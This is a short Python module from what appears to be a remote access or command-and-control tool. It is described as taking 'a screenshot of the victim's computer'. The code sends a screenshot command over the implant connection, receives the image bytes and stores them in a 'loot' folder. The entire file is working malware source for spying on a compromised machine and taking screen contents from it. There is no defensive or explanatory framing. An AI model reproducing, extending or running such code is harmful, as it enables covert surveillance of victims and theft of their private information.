from lib.debug import Debug
from lib.helper import ctime
import os

class module():
    def __init__(self):
        self.Command        = "screenshot"
        self.Name           = "Screenshotter"
        self.Description    = """This command takes a screenshot of the victim's computer."""
        self.Platform       = "multi"

    def _exec(self, dmos, args):
        dmos.conn.send(self.Command.encode())
        DATE = "sc_" + ctime(file=True) + ".png"
        lootFolder = "./loot/screenshots/"
        path = os.path.join(lootFolder, DATE)

        f = open(path, "wb")
        image_data = b''
        while b'FIN' not in (d := dmos.conn.recv(1024)): #FIN
            image_data += d
        f.write(image_data)
        f.close()
        Debug.tprint(f"Screenshot downloaded to loot folder --> {path}")
